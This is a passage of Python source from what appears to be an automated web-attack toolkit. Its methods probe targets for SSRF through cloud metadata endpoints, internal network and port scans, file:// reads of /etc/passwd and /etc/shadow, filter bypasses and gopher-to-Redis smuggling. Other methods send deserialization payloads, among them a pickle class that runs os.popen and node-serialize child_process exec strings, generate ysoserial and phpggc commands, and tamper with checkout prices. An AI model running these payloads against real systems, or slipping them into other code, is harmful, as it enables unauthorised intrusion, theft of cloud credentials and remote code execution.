                    results.append(f"  -> HTTP {status} | Size: {size}")
                    if status == "200" or int(size or 0) > 500:
                        results.append("  [!] Possible SSRF - server responded to internal URL")
                else:
                    results.append("  -> Response received")
            final = "\n".join(results)
            self._log_action("ssrf_basic_detection", target, final)
            return final
        except Exception as e:
            return f"[ERROR] ssrf_basic_detection failed: {str(e)}"

    def ssrf_cloud_metadata(self, target: str, url: str = "", param: str = "") -> str:
        """Test for cloud metadata endpoint SSRF (AWS, GCP, Azure)."""
        try:
            if not url:
                url = self._build_target_url(target, "/")
            metadata_urls = {
                "AWS IMDSv1": "http://169.254.169.254/latest/meta-data/",
                "AWS IMDSv2 Token": "http://169.254.169.254/latest/api/token",
                "GCP Metadata": "http://metadata.google.internal/computeMetadata/v1/",
                "Azure Metadata": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
                "DigitalOcean": "http://169.254.169.254/metadata/v1.json",
                "Kubernetes": "http://kubernetes.default.svc/api/v1/namespaces",
            }
            results = []
            results.append(f"[*] Cloud Metadata SSRF Scan against: {url}\n")
            for cloud, meta_url in metadata_urls.items():
                encoded = urllib.parse.quote(meta_url)
                test_url = f"{url}?url={encoded}" if "?" not in url else f"{url}&url={encoded}"
                cmd = f'{self.tool_paths["curl"]} -s -w "\\n%{{http_code}}" {shlex.quote(test_url)}'
                output = self.run_command(cmd, timeout=10)
                lines = output.strip().split("\n")
                status = lines[-1] if lines else "000"
                body = "\n".join(lines[:-1])
                results.append(f"[*] {cloud}:")
                results.append(f"  Metadata URL: {meta_url}")
                results.append(f"  HTTP Status: {status}")
                if status in ("200", "400", "401") and body:
                    results.append(f"  [!] Possible metadata access! Response: {body[:200]}")
                else:
                    results.append("  -> No access")
            final = "\n".join(results)
            self._log_action("ssrf_cloud_metadata", target, final)
            return final
        except Exception as e:
            return f"[ERROR] ssrf_cloud_metadata failed: {str(e)}"

    def ssrf_internal_network(
        self, target: str, url: str = "", param: str = "", network_range: str = "192.168.1."
    ) -> str:
        """Scan internal network ranges via SSRF."""
        try:
            if not url:
                url = self._build_target_url(target, "/")
            results = []
            results.append(f"[*] Internal Network SSRF Scan against: {url}")
            results.append(f"[*] Scanning range: {network_range}0/24\n")
            found = []
            for i in range(1, 255):
                ip = f"{network_range}{i}"
                encoded = urllib.parse.quote(f"http://{ip}/")
                test_url = f"{url}?url={encoded}" if "?" not in url else f"{url}&url={encoded}"
                cmd = (
                    f'{self.tool_paths["curl"]} -s -o /dev/null -w "%{{http_code}}" '
                    f"--connect-timeout 2 {shlex.quote(test_url)}"
                )
                status = self.run_command(cmd, timeout=5)
                if status.strip() in ("200", "301", "302", "401", "403"):
                    found.append(ip)
                    results.append(f"  [!] {ip} - HTTP {status.strip()} (Live)")
            if not found:
                results.append("\n  No live hosts found in range")
            else:
                results.append(f"\n  Found {len(found)} live hosts via SSRF")
            final = "\n".join(results)
            self._log_action("ssrf_internal_network", target, final)
            return final
        except Exception as e:
            return f"[ERROR] ssrf_internal_network failed: {str(e)}"

    def ssrf_file_read(self, target: str, url: str = "", param: str = "") -> str:
        """Attempt local file read via SSRF using file:// and other protocols."""
        try:
            if not url:
                url = self._build_target_url(target, "/")
            file_payloads = {
                "file:///etc/passwd": "Linux passwd file",
                "file:///etc/hostname": "System hostname",
                "file:///proc/self/environ": "Process environment",
                "file:///proc/self/cmdline": "Process command line",
                "file:///etc/hosts": "Hosts file",
                "file:///etc/shadow": "Shadow file (privileged)",
                "file:///proc/version": "Kernel version",
                "file:///proc/net/tcp": "TCP connections",
            }
            results = []
            results.append(f"[*] SSRF File Read Scan against: {url}\n")
            for file_path, description in file_payloads.items():
                encoded = urllib.parse.quote(file_path)
                test_url = f"{url}?url={encoded}" if "?" not in url else f"{url}&url={encoded}"
                cmd = f"{self.tool_paths['curl']} -s --max-time 5 {shlex.quote(test_url)}"
                output = self.run_command(cmd, timeout=10)
                results.append(f"[*] {description}: {file_path}")
                if output and len(output) > 10 and "error" not in output.lower():
                    results.append("  [!] File content potentially leaked:")
                    results.append(f"      {output[:300]}")
                else:
                    results.append("  -> Access denied or not vulnerable")
            final = "\n".join(results)
            self._log_action("ssrf_file_read", target, final)
            return final
        except Exception as e:
            return f"[ERROR] ssrf_file_read failed: {str(e)}"

    def ssrf_dns_rebinding(self, target: str, url: str = "", param: str = "", rebinding_domain: str = "") -> str:
        """Test for DNS rebinding SSRF vulnerabilities."""
        try:
            if not url:
                url = self._build_target_url(target, "/")
            if not rebinding_domain:
                rebinding_domain = "rbnd.glue"
            results = []
            results.append(f"[*] DNS Rebinding SSRF Scan against: {url}")
            results.append(f"[*] Rebinding domain: {rebinding_domain}\n")
            test_url = (
                f"{url}?url=http://{rebinding_domain}/" if "?" not in url else f"{url}&url=http://{rebinding_domain}/"
            )
            cmd = (
                f'{self.tool_paths["curl"]} -s -w "\\n%{{http_code}}\\n%{{remote_ip}}" '
                f"--max-time 10 {shlex.quote(test_url)}"
            )
            output = self.run_command(cmd, timeout=15)
            results.append(f"Response:\n{output[:500]}\n")
            results.append("[*] DNS Rebinding Check:")
            results.append("  - If remote_ip resolves to different IPs on successive requests")
            results.append("  - The application may be vulnerable to DNS rebinding")
            results.append(f"  - Use rebinding domain: {rebinding_domain}")
            results.append("  - Tools: rbnd.glue, taviso.io/rbnd")
            final = "\n".join(results)
            self._log_action("ssrf_dns_rebinding", target, final)
            return final
        except Exception as e:
            return f"[ERROR] ssrf_dns_rebinding failed: {str(e)}"

    def ssrf_blind_ssrf(self, target: str, url: str = "", param: str = "", collaborator: str = "") -> str:
        """Detect blind SSRF using out-of-band techniques."""
        try:
            if not url:
                url = self._build_target_url(target, "/")
            if not collaborator:
                collaborator = f"blindsurf-{int(time.time())}.oast.fun"
            results = []
            results.append(f"[*] Blind SSRF Scan against: {url}")
            results.append(f"[*] Collaborator domain: {collaborator}\n")
            test_payloads = [
                f"http://{collaborator}/",
                f"http://{collaborator}:443/",
                f"http://{collaborator}:8080/",
                f"http://{collaborator}:8443/",
            ]
            for i, payload in enumerate(test_payloads, 1):
                encoded = urllib.parse.quote(payload)
                test_url = f"{url}?url={encoded}" if "?" not in url else f"{url}&url={encoded}"
                cmd = f'{self.tool_paths["curl"]} -s -o /dev/null -w "%{{http_code}}" {shlex.quote(test_url)}'
                status = self.run_command(cmd, timeout=10)
                results.append(f"[{i}] Payload: {payload}")
                results.append(f"  -> HTTP {status.strip()}")
                results.append(f"  -> Check {collaborator} logs for incoming request")
            results.append(f"\n[*] Monitor {collaborator} for callback requests")
            results.append("[*] If callbacks received, blind SSRF is confirmed")
            final = "\n".join(results)
            self._log_action("ssrf_blind_ssrf", target, final)
            return final
        except Exception as e:
            return f"[ERROR] ssrf_blind_ssrf failed: {str(e)}"

    def ssrf_bypass_filter(self, target: str, url: str = "", param: str = "", bypass_type: str = "ip") -> str:
        """Bypass SSRF filters using various techniques."""
        try:
            if not url:
                url = self._build_target_url(target, "/")
            bypass_payloads = {
                "ip": [
                    "http://127.0.0.1",
                    "http://0x7f000001",
                    "http://2130706433",
                    "http://0177.0.0.1",
                    "http://127.1",
                    "http://127.0.0.1.nip.io",
                    "http://localtest.me",
                    "http://127.0.0.1%2523@evil.com",
                ],
                "schema": [
                    "gopher://127.0.0.1:25/",
                    "dict://127.0.0.1:6379/",
                    "tftp://127.0.0.1:69/",
                    "file:///etc/passwd",
                    "jar:http://127.0.0.1/",
                    "netdoc:///etc/passwd",
                ],
                "encoding": [
                    "http://127.0.0.1",
                    "http://%31%32%37.0.0.1",
                    "http://127.0%2e0.0.1",
                    "http://127.0.0.%31",
                    "http://①②⑦.0.0.1",
                    "http://①②⑦.⓪.⓪.①",
                ],
            }
            payloads = bypass_payloads.get(bypass_type, bypass_payloads["ip"])
            results = []
            results.append(f"[*] SSRF Filter Bypass ({bypass_type}) against: {url}\n")
            for i, payload in enumerate(payloads, 1):
                encoded = urllib.parse.quote(payload)
                test_url = f"{url}?url={encoded}" if "?" not in url else f"{url}&url={encoded}"
                cmd = (
                    f'{self.tool_paths["curl"]} -s -o /dev/null -w "%{{http_code}}" '
                    f"--max-time 5 {shlex.quote(test_url)}"
                )
                status = self.run_command(cmd, timeout=10).strip()
                results.append(f"[{i}] Bypass: {payload}")
                results.append(f"  -> HTTP {status}")
                if status in ("200", "301", "302"):
                    results.append("  [!] Bypass may be successful!")
            final = "\n".join(results)
            self._log_action("ssrf_bypass_filter", target, final)
            return final
        except Exception as e:
            return f"[ERROR] ssrf_bypass_filter failed: {str(e)}"

    def ssrf_protocol_smuggling(self, target: str, url: str = "", param: str = "") -> str:
        """Test for protocol smuggling via SSRF."""
        try:
            if not url:
                url = self._build_target_url(target, "/")
            smuggle_payloads = {
                "Gopher-Redis": "gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$11%0d%0ahacked_value%0d%0a",
                "Gopher-HTTP": "gopher://127.0.0.1:80/_GET%20/ HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0a%0d%0a",
                "Dict-Redis": "dict://127.0.0.1:6379/info",
                "Dict-MySQL": "dict://127.0.0.1:3306/",
                "TFTP": "tftp://127.0.0.1:69/test",
            }
            results = []
            results.append(f"[*] Protocol Smuggling SSRF Scan against: {url}\n")
            for name, payload in smuggle_payloads.items():
                encoded = urllib.parse.quote(payload)
                test_url = f"{url}?url={encoded}" if "?" not in url else f"{url}&url={encoded}"
                cmd = f"{self.tool_paths['curl']} -s --max-time 5 {shlex.quote(test_url)}"
                output = self.run_command(cmd, timeout=10)
                results.append(f"[*] {name}:")
                results.append(f"  Payload: {payload[:80]}...")
                if output and len(output) > 5:
                    results.append(f"  [!] Response received ({len(output)} bytes)")
                    if "redis_version" in output.lower():
                        results.append("  [!] Redis info leaked!")
                else:
                    results.append("  -> No response or connection refused")
            final = "\n".join(results)
            self._log_action("ssrf_protocol_smuggling", target, final)
            return final
        except Exception as e:
            return f"[ERROR] ssrf_protocol_smuggling failed: {str(e)}"

    def ssrf_redirect_chain(self, target: str, url: str = "", param: str = "", redirect_url: str = "") -> str:
        """Test SSRF via open redirect chains."""
        try:
            if not url:
                url = self._build_target_url(target, "/")
            if not redirect_url:
                redirect_url = "http://127.0.0.1/"
            results = []
            results.append(f"[*] SSRF Redirect Chain Test against: {url}")
            results.append(f"[*] Testing redirect chain to: {redirect_url}\n")
            redirect_endpoints = [
                "/redirect?url=",
                "/goto?url=",
                "/next?url=",
                "/forward?url=",
                "/jump?url=",
                "/out?url=",
            ]
            for endpoint in redirect_endpoints:
                chain_url = self._build_target_url(target, endpoint, f"next={urllib.parse.quote(redirect_url)}")
                cmd = (
                    f"{self.tool_paths['curl']} -s -L --max-redirs 3 "
                    f'-o /dev/null -w "%{{url_effective}}\\n%{{http_code}}" '
                    f"{shlex.quote(chain_url)}"
                )
                output = self.run_command(cmd, timeout=10)
                lines = output.strip().split("\n")
                final_url = lines[0] if lines else "N/A"
                status = lines[1] if len(lines) > 1 else "N/A"
                results.append(f"  Endpoint: {endpoint}")
                results.append(f"  -> Final URL: {final_url}")
                results.append(f"  -> Status: {status}")
                if "127.0.0.1" in final_url or "localhost" in final_url:
                    results.append("  [!] Redirect chain leads to internal host!")
            final = "\n".join(results)
            self._log_action("ssrf_redirect_chain", target, final)
            return final
        except Exception as e:
            return f"[ERROR] ssrf_redirect_chain failed: {str(e)}"

    def ssrf_port_scan(self, target: str, url: str = "", param: str = "", host: str = "127.0.0.1") -> str:
        """Perform port scanning via SSRF."""
        try:
            if not url:
                url = self._build_target_url(target, "/")
            common_ports = [
                21,
                22,
                25,
                53,
                80,
                110,
                111,
                135,
                139,
                143,
                443,
                445,
                993,
                995,
                1433,
                1521,
                2049,
                3306,
                3389,
                5432,
                5900,
                6379,
                8080,
                8443,
                8888,
                9090,
                27017,
            ]
            results = []
            results.append(f"[*] SSRF Port Scan against: {host} via {url}")
            results.append(f"[*] Scanning {len(common_ports)} common ports\n")
            open_ports = []
            for port in common_ports:
                scan_url = f"http://{host}:{port}/"
                encoded = urllib.parse.quote(scan_url)
                test_url = f"{url}?url={encoded}" if "?" not in url else f"{url}&url={encoded}"
                cmd = (
                    f'{self.tool_paths["curl"]} -s -o /dev/null -w "%{{http_code}}" '
                    f"--connect-timeout 2 {shlex.quote(test_url)}"
                )
                status = self.run_command(cmd, timeout=5).strip()
                if status in ("200", "301", "302", "403", "401", "000"):
                    open_ports.append(port)
                    results.append(f"  [!] Port {port}: OPEN (HTTP {status})")
            results.append(f"\n  Total open ports: {len(open_ports)}")
            if open_ports:
                results.append(f"  Open ports: {', '.join(str(p) for p in open_ports)}")
            final = "\n".join(results)
            self._log_action("ssrf_port_scan", target, final)
            return final
        except Exception as e:
            return f"[ERROR] ssrf_port_scan failed: {str(e)}"

    # =========================================================================
    # DESERIALIZATION METHODS (10)
    # =========================================================================

    def deser_php_unserialize(self, target: str, url: str = "", param: str = "", payload_type: str = "basic") -> str:
        """Test for PHP deserialization vulnerabilities."""
        try:
            if not url:
                url = self._build_target_url(target, "/")
            php_payloads = {
                "basic": 'O:8:"stdClass":0:{}',
                "destruct": 'O:11:"FileManager":1:{s:8:"filename";s:11:"/etc/passwd";}',
                "readfile": 'O:8:"FileRead":1:{s:8:"filepath";s:11:"/etc/passwd";}',
                "cmdexec": 'O:7:"Command":1:{s:7:"command";s:9:"id";}',
                "pop_chain": 'a:2:{i:0;O:4:"User":1:{s:4:"name";s:6:"admin";}i:1;s:10:"destruct";}',
            }
            payload = php_payloads.get(payload_type, php_payloads["basic"])
            encoded = urllib.parse.quote(payload)
            results = []
            results.append(f"[*] PHP Unserialize Test against: {url}")
            results.append(f"[*] Payload type: {payload_type}")
            results.append(f"[*] Serialized: {payload}\n")
            test_url = f"{url}?{param or 'data'}={encoded}" if "?" not in url else f"{url}&{param or 'data'}={encoded}"
            cmd = f"{self.tool_paths['curl']} -s --max-time 10 {shlex.quote(test_url)}"
            output = self.run_command(cmd, timeout=15)
            results.append(f"Response ({len(output)} bytes):")
            results.append(output[:500])
            if "root:" in output or "fatal error" in output.lower():
                results.append("\n[!] Potential PHP deserialization vulnerability detected!")
            final = "\n".join(results)
            self._log_action("deser_php_unserialize", target, final)
            return final
        except Exception as e:
            return f"[ERROR] deser_php_unserialize failed: {str(e)}"

    def deser_java_objects(
        self, target: str, url: str = "", param: str = "", gadget: str = "commons-collections"
    ) -> str:
        """Test for Java deserialization vulnerabilities."""
        try:
            if not url:
                url = self._build_target_url(target, "/")
            java_payloads = {
                "commons-collections": "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hc...",
                "commons-beanutils": "rO0ABXNyABNqYXZhLmJlYW5zLlByb3BlcnRpZXM...",
                "spring": "rO0ABXNyAB9vcmcu...springframework...",
                "jackson": "eyAiY2xhc3MiOiAiY29tLmV4YW1wbGUuVXNlciIsICJuYW1lIjogImFkbWluIn0=",
            }
            results = []
            results.append(f"[*] Java Deserialization Test against: {url}")
            results.append(f"[*] Gadget chain: {gadget}\n")
            results.append("[*] Testing common Java deserialization endpoints...")
            java_endpoints = [
                "/object",
                "/deserialize",
                "/api/object",
                "/rest/object",
                "/api/v1/object",
                "/download",
            ]
            for endpoint in java_endpoints:
                test_url = self._build_target_url(target, endpoint)
                cmd = (
                    f"{self.tool_paths['curl']} -s -X POST "
                    f'-H "Content-Type: application/octet-stream" '
                    f'-d "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==" '
                    f'-o /dev/null -w "%{{http_code}}" {shlex.quote(test_url)}'
                )
                status = self.run_command(cmd, timeout=10).strip()
                results.append(f"  {endpoint} -> HTTP {status}")
                if status in ("200", "500"):
                    results.append("  [!] May be vulnerable to deserialization!")
            results.append("\n[*] Recommended tools for exploitation:")
            results.append("  - ysoserial (Java gadget chains)")
            results.append("  - JndiExploit (Log4Shell)")
            results.append("  - Burp Suite deserialization scanner")
            final = "\n".join(results)
            self._log_action("deser_java_objects", target, final)
            return final
        except Exception as e:
            return f"[ERROR] deser_java_objects failed: {str(e)}"

    def deser_python_pickle(self, target: str, url: str = "", param: str = "") -> str:
        """Test for Python pickle deserialization vulnerabilities."""
        try:
            if not url:
                url = self._build_target_url(target, "/")
            import base64
            import pickle

            class ExploitPayload:
                def __reduce__(self):
                    return (eval, ("__import__('os').popen('id').read()",))

            payload = base64.b64encode(pickle.dumps(ExploitPayload())).decode()
            results = []
            results.append(f"[*] Python Pickle Deserialization Test against: {url}")
            results.append(f"[*] Base64 payload: {payload[:80]}...\n")
            encoded = urllib.parse.quote(payload)
            test_url = f"{url}?{param or 'data'}={encoded}" if "?" not in url else f"{url}&{param or 'data'}={encoded}"
            cmd = f"{self.tool_paths['curl']} -s --max-time 10 {shlex.quote(test_url)}"
            output = self.run_command(cmd, timeout=15)
            results.append(f"Response ({len(output)} bytes):")
            results.append(output[:500])
            if "uid=" in output or "error" in output.lower():
                results.append("\n[!] Potential pickle deserialization vulnerability detected!")
            results.append("\n[*] Additional pickle payloads to test:")
            results.append("  - __import__('os').system('whoami')")
            results.append("  - __import__('subprocess').check_output(['id'])")
            results.append("  - Use pickletools.dis() for analysis")
            final = "\n".join(results)
            self._log_action("deser_python_pickle", target, final)
            return final
        except Exception as e:
            return f"[ERROR] deser_python_pickle failed: {str(e)}"

    def deser_net_binary(self, target: str, url: str = "", param: str = "", format_type: str = "binary") -> str:
        """Test for .NET BinaryFormatter deserialization vulnerabilities."""
        try:
            if not url:
                url = self._build_target_url(target, "/")
            results = []
            results.append(f"[*] .NET Binary Deserialization Test against: {url}")
            results.append(f"[*] Format: {format_type}\n")
            net_endpoints = [
                "/api/ deserialize",
                "/object",
                "/api/data",
                "/rest/binary",
                "/handler.ashx",
                "/api/v1/import",
            ]
            msdn_payloads = {
                "binary": "AAEAAAD/////AQAAAAAAAAAMAgAAAFFTeXN0ZW0sIFZlcnNpb249NC4w",
                "soap": "<ser:Type>System.Windows.Data.ObjectDataProvider</ser:Type>",
                "json": '{"$type":"System.Windows.Data.ObjectDataProvider","$value":{}}',
            }
            for endpoint in net_endpoints:
                test_url = self._build_target_url(target, endpoint)
                payload = msdn_payloads.get(format_type, msdn_payloads["binary"])
                cmd = (
                    f"{self.tool_paths['curl']} -s -X POST "
                    f'-H "Content-Type: application/octet-stream" '
                    f"-d {shlex.quote(payload)} "
                    f'-o /dev/null -w "%{{http_code}}" {shlex.quote(test_url)}'
                )
                status = self.run_command(cmd, timeout=10).strip()
                results.append(f"  {endpoint} -> HTTP {status}")
            results.append("\n[*] .NET Deserialization gadgets:")
            results.append("  - ObjectDataProvider")
            results.append("  - ResourceDataSource")
            results.append("  - DataSet / DataTable")
            results.append("  - PSObject")
            results.append("[*] Tools: ysoserial.net, DotNetToJScript")
            final = "\n".join(results)
            self._log_action("deser_net_binary", target, final)
            return final
        except Exception as e:
            return f"[ERROR] deser_net_binary failed: {str(e)}"

    def deser_ruby_marshal(self, target: str, url: str = "", param: str = "") -> str:
        """Test for Ruby Marshal deserialization vulnerabilities."""
        try:
            if not url:
                url = self._build_target_url(target, "/")
            results = []
            results.append(f"[*] Ruby Marshal Deserialization Test against: {url}\n")
            ruby_endpoints = [
                "/api/object",
                "/data",
                "/import",
                "/upload",
                "/session",
                "/cookie",
                "/api/v1/data",
            ]
            ruby_payloads = [
                "BAhJIlRlc3QiBjoOQG5pbCB7ImEiOiIxIn0=",
                "BAhJIlRlc3QiBkOAB3tidSI6ImMhdHRhY2tfdXNlcl9pbmplY3Rpb24ifQ==",
            ]
            for endpoint in ruby_endpoints:
                test_url = self._build_target_url(target, endpoint)
                for payload in ruby_payloads:
                    cmd = (
                        f"{self.tool_paths['curl']} -s -X POST "
                        f'-H "Content-Type: application/x-ruby-marshal" '
                        f"-d {shlex.quote(payload)} "
                        f'-o /dev/null -w "%{{http_code}}" {shlex.quote(test_url)}'
                    )
                    status = self.run_command(cmd, timeout=10).strip()
                    results.append(f"  {endpoint} (payload {ruby_payloads.index(payload) + 1}) -> HTTP {status}")
            results.append("\n[*] Ruby deserialization gadgets:")
            results.append("  - ERB (Server Side Templates)")
            results.append("  - Gem::Requirement")
            results.append("  - Gem::StubSpecification")
            results.append("  - ActiveSupport::HashWithIndifferentAccess")
            results.append("[*] Tools: ruby-deserialization-exploit, marshal-exploit")
            final = "\n".join(results)
            self._log_action("deser_ruby_marshal", target, final)
            return final
        except Exception as e:
            return f"[ERROR] deser_ruby_marshal failed: {str(e)}"

    def deser_node_serialize(
        self, target: str, url: str = "", param: str = "", format_type: str = "node-serialize"
    ) -> str:
        """Test for Node.js deserialization vulnerabilities."""
        try:
            if not url:
                url = self._build_target_url(target, "/")

            node_payloads = {
                "node-serialize": 'rce":"_$$ND_FUNC$$_function(){require("child_process").exec("id",function(e,r){global.process.stdout.write(r)})}()}',
                "function": "{\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').execSync('id')}()\"}",
                "template": '{"__proto__":{"pollution":"yes"}}',
            }
            payload = node_payloads.get(format_type, node_payloads["node-serialize"])
            encoded = urllib.parse.quote(payload)
            results = []
            results.append(f"[*] Node.js Deserialization Test against: {url}")
            results.append(f"[*] Format: {format_type}\n")
            test_url = f"{url}?{param or 'data'}={encoded}" if "?" not in url else f"{url}&{param or 'data'}={encoded}"
            cmd = f"{self.tool_paths['curl']} -s --max-time 10 {shlex.quote(test_url)}"
            output = self.run_command(cmd, timeout=15)
            results.append(f"Response ({len(output)} bytes):")
            results.append(output[:500])
            if "uid=" in output.lower() or "node" in output.lower():
                results.append("\n[!] Potential Node.js deserialization vulnerability detected!")
            results.append("\n[*] Node.js deserialization gadgets:")
            results.append("  - _$$ND_FUNC$$ function wrapper")
            results.append("  - Function constructor abuse")
            results.append("  - Prototype pollution")
            results.append("[*] Tools: node-serialize RCE PoC, prototype pollution scanners")
            final = "\n".join(results)
            self._log_action("deser_node_serialize", target, final)
            return final
        except Exception as e:
            return f"[ERROR] deser_node_serialize failed: {str(e)}"

    def deser_gadget_chain(self, target: str, url: str = "", language: str = "java") -> str:
        """Discover and test deserialization gadget chains."""
        try:
            if not url:
                url = self._build_target_url(target, "/")
            results = []
            results.append(f"[*] Gadget Chain Discovery for: {url}")
            results.append(f"[*] Language: {language}\n")
            gadget_info = {
                "java": {
                    "tools": ["ysoserial", "GadgetProbe", "GadgetInsighter"],
                    "chains": [
                        "CommonsCollections1-7",
                        "CommonsBeanutils",
                        "Spring1-2",
                        "Hibernate1-2",
                        "JavassistWeld1",
                        "JBossInterceptors1",
                        "JSON1",
                        "Click1-2",
                    ],
                    "endpoints": ["/api", "/rest", "/download", "/import", "/object"],
                },
                "php": {
                    "tools": ["phpggc", "phar-deserialization"],
                    "chains": [
                        "Monolog/RCE1-3",
                        "Laravel/RCE1-5",
                        "WordPress/RCE1",
                        "Yii/RCE1-2",
                        "ThinkPHP/RCE1-2",
                    ],
                    "endpoints": ["/api", "/upload", "/import", "/restore", "/download"],
                },
                "python": {
                    "tools": ["pickletools", "pyserial"],
                    "chains": [
                        "Pickle RCE",
                        "Pandas DataFrame",
                        "Shelve Deserialization",
                        "PyYAML Load",
                        " marshal.load",
                    ],
                    "endpoints": ["/api", "/data", "/import", "/cache", "/session"],
                },
            }
            lang_info = gadget_info.get(language, gadget_info["java"])
            results.append("Known gadget chains:")
            for chain in lang_info["chains"]:
                results.append(f"  - {chain}")
            results.append("\nTools:")
            for tool in lang_info["tools"]:
                results.append(f"  - {tool}")
            results.append("\nTesting endpoints:")
            for endpoint in lang_info["endpoints"]:
                test_url = self._build_target_url(target, endpoint)
                cmd = (
                    f'{self.tool_paths["curl"]} -s -o /dev/null -w "%{{http_code}}" '
                    f"--max-time 5 {shlex.quote(test_url)}"
                )
                status = self.run_command(cmd, timeout=8).strip()
                results.append(f"  {endpoint} -> HTTP {status}")
            final = "\n".join(results)
            self._log_action("deser_gadget_chain", target, final)
            return final
        except Exception as e:
            return f"[ERROR] deser_gadget_chain failed: {str(e)}"

    def deser_type_confusion(self, target: str, url: str = "", param: str = "") -> str:
        """Test for deserialization type confusion vulnerabilities."""
        try:
            if not url:
                url = self._build_target_url(target, "/")
            type_payloads = [
                {"type": "array", "payload": "[1,2,3]"},
                {"type": "object", "payload": '{"key":"value","nested":{"a":1}}'},
                {"type": "boolean", "payload": "true"},
                {"type": "null", "payload": "null"},
                {"type": "string", "payload": "test_string"},
                {"type": "number", "payload": "12345"},
                {"type": "mixed", "payload": '{"type":"User","data":"admin"}'},
                {"type": "recursive", "payload": '{"__proto__":{"isAdmin":true}}'},
            ]
            results = []
            results.append(f"[*] Type Confusion Deserialization Test against: {url}\n")
            for item in type_payloads:
                encoded = urllib.parse.quote(item["payload"])
                test_url = (
                    f"{url}?{param or 'data'}={encoded}" if "?" not in url else f"{url}&{param or 'data'}={encoded}"
                )
                cmd = f'{self.tool_paths["curl"]} -s -w "\\n%{{http_code}}" {shlex.quote(test_url)}'
                output = self.run_command(cmd, timeout=10)
                lines = output.strip().split("\n")
                status = lines[-1] if lines else "N/A"
                body = "\n".join(lines[:-1])
                results.append(f"  Type: {item['type']} -> HTTP {status}")
                if "error" in body.lower() or "exception" in body.lower():
                    results.append("    [!] Error indicates type confusion")
            results.append("\n[*] Type confusion may lead to:")
            results.append("  - Privilege escalation via object injection")
            results.append("  - Bypass security checks")
            results.append("  - Prototype pollution (JavaScript)")
            final = "\n".join(results)
            self._log_action("deser_type_confusion", target, final)
            return final
        except Exception as e:
            return f"[ERROR] deser_type_confusion failed: {str(e)}"

    def deser_payload_gen(
        self, target: str, url: str = "", language: str = "java", gadget: str = "default", command: str = "id"
    ) -> str:
        """Generate deserialization exploit payloads."""
        try:
            if not url:
                url = self._build_target_url(target, "/")
            results = []
            results.append("[*] Deserialization Payload Generator")
            results.append(f"[*] Language: {language} | Gadget: {gadget} | Command: {command}\n")
            payload_map = {
                "java": {
                    "commons-collections": f"ysoserial CommonsCollections1 '{command}' | base64",
                    "spring": f"ysoserial Spring1 '{command}' | base64",
                    "hibernate": f"ysoserial Hibernate1 '{command}' | base64",
                },
                "php": {
                    "monolog": f"phpggc Monolog/RCE1 system '{command}' | base64",
                    "laravel": f"phpggc Laravel/RCE1 system '{command}' | base64",
                },
                "python": {
                    "pickle": "import pickle, base64; class P:\\n  def __reduce__(self):\\n    return (eval, (\"__import__('os').popen('\" + command + \"').read()\",))\\nprint(base64.b64encode(pickle.dumps(P())).decode())",
                },
            }
            results.append("=== Generated Commands ===")
            lang_payloads = payload_map.get(language, payload_map["java"])
            for name, cmd in lang_payloads.items():
                results.append(f"\n[*] {name}:")
                results.append(f"  Command: {cmd}")
            results.append("\n=== Usage Instructions ===")
            results.append("1. Generate payload using the command above")
            results.append("2. Base64-encode the output")
            results.append("3. Send encoded payload to the vulnerable endpoint")
            results.append("4. Monitor for command execution")
            final = "\n".join(results)
            self._log_action("deser_payload_gen", target, final)
            return final
        except Exception as e:
            return f"[ERROR] deser_payload_gen failed: {str(e)}"

    def deser_blind_detect(self, target: str, url: str = "", param: str = "") -> str:
        """Detect blind deserialization vulnerabilities."""
        try:
            if not url:
                url = self._build_target_url(target, "/")
            results = []
            results.append(f"[*] Blind Deserialization Detection against: {url}\n")
            test_payloads = [
                {"name": "Timing-based", "method": "time", "payload": "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA=="},
                {"name": "OOB-HTTP", "method": "http", "payload": "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA=="},
                {"name": "Error-based", "method": "error", "payload": "invalid_base64_payload"},
                {"name": "DNS-based", "method": "dns", "payload": "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA=="},
            ]
            for test in test_payloads:
                encoded = urllib.parse.quote(test["payload"])
                test_url = (
                    f"{url}?{param or 'data'}={encoded}" if "?" not in url else f"{url}&{param or 'data'}={encoded}"
                )
                start_time = time.time()
                cmd = f'{self.tool_paths["curl"]} -s -w "\\n%{{time_total}}" {shlex.quote(test_url)}'
                output = self.run_command(cmd, timeout=15)
                elapsed = time.time() - start_time
                lines = output.strip().split("\n")
                time_total = lines[-1] if lines else "N/A"
                results.append(f"  {test['name']} test:")
                results.append(f"    Elapsed: {elapsed:.2f}s | curl time: {time_total}s")
                if elapsed > 5:
                    results.append("    [!] Slow response may indicate deserialization processing")
            results.append("\n[*] Blind deserialization indicators:")
            results.append("  - Significant response time differences")
            results.append("  - Out-of-band callback received")
            results.append("  - Error messages leaking class information")
            results.append("  - Changes in response body/headers")
            final = "\n".join(results)
            self._log_action("deser_blind_detect", target, final)
            return final
        except Exception as e:
            return f"[ERROR] deser_blind_detect failed: {str(e)}"

    # =========================================================================
    # BUSINESS LOGIC METHODS (5)
    # =========================================================================

    def logic_price_manipulation(self, target: str, url: str = "", product_id: str = "1", price: str = "0.01") -> str:
        """Test for price manipulation vulnerabilities."""
        try:
            if not url:
                url = self._build_target_url(target, "/checkout")
            results = []
            results.append(f"[*] Price Manipulation Test against: {url}")
            results.append(f"[*] Product: {product_id} | Modified price: {price}\n")
            manipulation_params = [
                f"price={price}",
                f"amount={price}",
                f"cost={price}",
                f"total={price}",
                f"unit_price={price}",
                f"product_price={price}",
                "discount=100",
                "coupon=FREE",
                "quantity=-1",
                "quantity=0",
            ]
            for param in manipulation_params:
                cmd = (
                    f"{self.tool_paths['curl']} -s -X POST "
                    f"-d {shlex.quote(f'product_id={product_id}&{param}')} "
                    f'-H "Content-Type: application/x-www-form-urlencoded" '
                    f"{shlex.quote(url)}"
                )
                output = self.run_command(cmd, timeout=10)
                results.append(f"  Param: {param}")
                if "error" not in output.lower() and "invalid" not in output.lower():
                    results.append("    [!] No error - price manipulation may be possible")
                else:
                    results.append("    -> Validation detected")
            results.append("\n[*] Also check:")
            results.append("  - Server-side price validation")
            results.append("  - Negative quantity attacks")
